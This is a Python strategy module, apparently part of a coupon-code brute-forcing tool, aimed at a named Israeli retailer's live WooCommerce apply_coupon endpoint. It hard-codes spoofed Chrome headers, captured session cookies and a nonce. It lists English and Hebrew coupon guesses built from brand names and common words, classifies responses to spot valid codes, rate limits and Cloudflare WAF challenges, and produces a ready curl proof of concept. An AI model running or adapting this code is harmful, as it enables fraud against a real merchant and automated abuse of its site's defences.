import re
from models import TriageStatus
from strategies.base import BaseRetailerStrategy, clean_html, LI_REGEX


class TalronStrategy(BaseRetailerStrategy):
    """Strategy implementation for Talron (WooCommerce standard HTML AJAX endpoint)."""

    @property
    def name(self) -> str:
        return "talron"

    @property
    def display_name(self) -> str:
        return "Talron"

    @property
    def target_url(self) -> str:
        return "https://tal-ron.co.il/?wc-ajax=apply_coupon"

    @property
    def headers(self) -> dict[str, str]:
        return {
            "Accept": "text/html, */*; q=0.01",
            "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://tal-ron.co.il",
            "Referer": "https://tal-ron.co.il/checkout/",
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/152.0.0.0 Safari/537.36"
            ),
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Chromium";v="152", "Not/A)Brand";v="24", "Google Chrome";v="152"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }

    @property
    def default_cookies(self) -> dict[str, str]:
        return {
            "woocommerce_items_in_cart": "1",
            "woocommerce_cart_hash": "5fd3b1b03a50d0fdad40d5913ec09e79",
            "wp_woocommerce_session_45cde17e3bb7e2c7a69d1e815ff95c50": (
                "t_f72fadd2bc1f5a6768d799f2353d5e|1788882976|1788796576|3372538dea427d05ab4b8eb2e2a53ea8"
            ),
        }

    @property
    def default_nonce(self) -> str:
        return "e31e652ac3"

    @property
    def baseline_candidates(self) -> list[str]:
        return ["Welcome5", "welcome7"]

    def build_payload(self, coupon: str, nonce: str) -> dict[str, str]:
        return {
            "security": nonce,
            "coupon_code": coupon,
            "billing_email": "",
        }

    def triage_response(self, text: str, status_code: int) -> tuple[bool, str, str]:
        if status_code == 429:
            return False, TriageStatus.RATE_LIMITED, "HTTP 429 Too Many Requests (Rate limit hit)"

        if status_code == 403:
            if text.strip() == "-1":
                return False, TriageStatus.EXPIRED_NONCE, "Security nonce or session cookie expired (HTTP 403 / -1)"
            if "cf-mitigated" in text or "challenge-running" in text or "Cloudflare" in text:
                return False, TriageStatus.WAF_CHALLENGE, "Cloudflare WAF challenge triggered"
            return False, TriageStatus.EXPIRED_NONCE, f"HTTP 403 Forbidden: {text[:80]}"

        if "woocommerce-message" in text:
            match = re.search(r'class="[^"]*woocommerce-message[^"]*"[^>]*>(.*?)</div>', text, re.DOTALL)
            msg = clean_html(match.group(1)) if match else "קוד הקופון הוחל בהצלחה."
            return True, TriageStatus.APPLIED, msg

        if "woocommerce-error" in text:
            li_match = LI_REGEX.search(text)
            raw_msg = li_match.group(1) if li_match else text
            msg = clean_html(raw_msg)

            if any(kw in msg for kw in ["לא קיים", "אינו קיים"]) or "does not exist" in msg.lower():
                return False, TriageStatus.INVALID, msg

            if any(kw in msg for kw in ["כבר הוחל", "כבר נוסף"]) or "already applied" in msg.lower():
                return True, TriageStatus.ALREADY_APPLIED, msg

            return True, TriageStatus.RESTRICTED, f"Exists (conditional): {msg}"

        return False, TriageStatus.INVALID, f"Unknown response ({status_code}): {clean_html(text[:100])}"

    def get_brand_tokens(self) -> tuple[list[str], list[str]]:
        brand_en = ["talron", "tal-ron", "tal", "ron"]
        brand_he = ["טלרון", "טל-רון", "טל", "רון"]
        return brand_en, brand_he

    def get_dedicated_seeds(self) -> list[str]:
        return [
            "welcome5", "talron50", "welcome10", "talron10",
            "tal1", "ron10", "tal10", "ron1", "tal5", "ron5",
            "טל1", "רון10", "טל10", "רון1", "טל5", "רון5",
            "cohen10", "cohen1", "כהן10", "כהן1", "levi10", "לוי10",
        ]

    def get_niche_keywords(self) -> list[str]:
        return [
            "tools", "garage", "work", "pro", "tech", "auto",
            "כלים", "מוסך", "עבודה", "מקצועי", "טכני"
        ]

    def get_curl_poc(self, coupon: str, nonce: str) -> str:
        return f"curl -s -X POST '{self.target_url}' -d 'security={nonce}&coupon_code={coupon}&billing_email='"
